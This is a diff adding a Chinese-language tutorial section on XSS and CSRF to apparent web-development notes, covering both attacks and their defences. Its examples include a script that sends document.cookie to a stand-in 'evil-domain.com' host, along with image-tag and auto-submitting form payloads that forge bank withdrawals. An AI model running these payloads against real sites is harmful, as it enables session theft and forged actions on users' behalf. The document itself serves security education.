@@ -453,3 +453,112 @@ HMACSHA256(
 项目中一般会使用对应的包（比如jsonwebtoken）来进行JWT的token签发和验证，secret通常也会存储到环境变量中。
 
 ## XSS和CSRF
+
+XSS 全称“跨站脚本”，是注入攻击的一种。其特点是不对服务器端造成任何伤害，而是通过一些正常的站内交互途径，例如发布评论，提交含有 JavaScript 的内容文本。这时服务器端如果没有过滤或转义掉这些脚本，作为内容发布到了页面上，其他用户访问这个页面的时候就会运行这些脚本。
+
+比如：
+
+单纯的恶作剧：
+
+```js
+while (true) {
+  alert('你关不掉我！')
+}
+```
+
+窃取取cookie：
+
+```js
+new Image().src = 'http://www.evil-domain.com/steal-cookie.php?cookie=' + document.cookie
+```
+
+恶意跳转：
+
+```html
+<script>
+  window.location.href="http://www.baidu.com";
+</script>
+```
+
+CSRF 的全称是“跨站请求伪造”，顾名思义，是伪造请求，冒充用户在站内的正常操作。攻击者诱导受害者进入第三方网站，在第三方网站中，向被攻击网站发送跨站请求。利用受害者在被攻击网站已经获取的注册凭证，绕过后台的用户验证，达到冒充用户对被攻击的网站执行某项操作的目的。
+
+一个典型的CSRF攻击有着如下的流程：
+
+1. 受害者登录http://a.com，并保留了登录凭证（Cookie）。
+
+2. 攻击者引诱受害者访问了http://b.com。
+
+3. http://b.com 向 http://a.com 发送了一个请求：http://a.com/act=xx。浏览器会默认携带http://a.com的Cookie。
+
+4. http://a.com接收到请求后，对请求进行验证，并确认是受害者的凭证，误以为是受害者自己发送的请求。
+
+5. http://a.com以受害者的名义执行了act=xx。
+
+6. 攻击完成，攻击者在受害者不知情的情况下，冒充受害者，让http://a.com执行了自己定义的操作。
+
+
+比如一些网站的资源操作接口是通过get访问的，GET类型的CSRF利用非常简单，只需要一个HTTP请求，
+
+比如论坛帖子创建删除：
+
+```js
+<img src="http://example.com/bbs/create_post.php?title=标题&content=内容">
+```
+
+再比如向银行发送一个请求（实际上不可能，只是一个假设）:
+
+```html
+ <img src="http://bank.example/withdraw?amount=10000&for=hacker" > 
+```
+
+另外，使用POST的请求也会受到CSRF的攻击：
+
+比如，通过伪造表单提交发送POST请求
+
+```JS
+<form action="http://bank.example/withdraw" method=POST>
+    <input type="hidden" name="account" value="xiaoming" />
+    <input type="hidden" name="amount" value="10000" />
+    <input type="hidden" name="for" value="hacker" />
+</form>
+<script> document.forms[0].submit(); </script> 
+```
+
+
+CSRF与XSS都属于跨站攻击--不攻击服务器攻击用户，但是，它们的攻击类型属于不同的维度。XSS也能伪造请求，所以，XSS是实现CSRF的一种方式，还有很多其他的方式来实现CSRF。
+
+如何防范XSS和CSRF?
+
+针对XSS，首先是过滤；比如过滤掉`<script>` `<a>` `<img>`这些标签。其次是编码；像一些常见的符号，如<>在输入的时候要对其进行转换编码，这样做浏览器是不会对该标签进行解释执行的，同时也不影响显示效果。最后是限制，xss攻击要能达成往往需要较长的字符串，因此对于一些可以预期的输入可以通过限制长度强制截断来进行防御，另外，针对身份认证cookie需要限制浏览器对其的操作。
+
+针对CSRF，首先严格遵守REST风格的设计，避免重要的接口使拥GET。其次，我们通过观察可以发现，CSRF攻击都是从第三方网站发起的，本质也就是需要跨站，所以我们可以启用同源检测。
+
+同源检测：
+
+直接禁止第三方网站或者不受信任的域名对我们发起的请求。
+
+在HTTP协议中，每一个请求通常会携带以下两个请求头：
+
+* Origin Header
+* Refer Header
+
+这两个Header在浏览器发起请求时，大多数情况会自动带上，并且不能由前端自定义内容。
+
+针对 Origin 以下两种情况不会存在：
+
+- IE11同源策略： IE 11 不会在跨站CORS请求上添加Origin标头，Referer头将仍然是唯一的标识。最根本原因是因为IE 11对同源的定义和其他浏览器有不同，有两个主要的区别，可以参考[https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy](https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy)
+
+- 302重定向： 在302重定向之后Origin不包含在重定向的请求中，因为Origin可能会被认为是其他来源的敏感信息。对于302重定向的情况来说都是定向到新的服务器上的URL，因此浏览器不想将Origin泄漏到新的服务器上。
+
+所以需要使用Referer Header确定来源域名：
+
+根据HTTP协议，在HTTP头中有一个字段叫Referer，记录了该HTTP请求的来源地址。
+
+对于Ajax请求，图片和script等资源请求，Referer为发起请求的页面地址。对于页面跳转，Referer为打开页面历史记录的前一个页面地址。因此我们使用Referer中链接的Origin部分可以得知请求的来源域名。
+
+这种方法并非万无一失，Referer的值是由浏览器提供的，虽然HTTP协议上有明确的要求，但是每个浏览器对于Referer的具体实现可能有差别，并不能保证浏览器自身没有安全漏洞。使用验证 Referer 值的方法，就是把安全性都依赖于第三方（即浏览器）来保障，从理论上来讲，这样并不是很安全。在部分情况下，攻击者可以隐藏，甚至修改自己请求的Referer。
+
+内容过长，关于XSS攻击和CSRF攻击可以查看以下两篇文章：
+
+[https://tech.meituan.com/2018/09/27/fe-security.html](https://tech.meituan.com/2018/09/27/fe-security.html)
+[https://tech.meituan.com/2018/10/11/fe-security-csrf.html](https://tech.meituan.com/2018/10/11/fe-security-csrf.html)
